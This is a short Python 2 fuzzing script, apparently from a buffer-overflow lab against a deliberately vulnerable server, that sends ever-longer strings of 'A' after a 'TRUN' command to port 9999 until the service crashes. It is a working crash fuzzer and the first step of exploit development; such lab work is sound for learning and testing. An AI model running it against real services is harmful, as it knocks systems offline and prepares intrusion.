#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

vulnServerIP = "192.168.1.100"   #Your vuln server's IP. In my case, it is 192.168.1.100

#Check at <Num> bytes the vuln server will crash
while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((vulnServerIP,9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print "Crashed at %s system byte" % str(len(buffer))
        sys .exit()
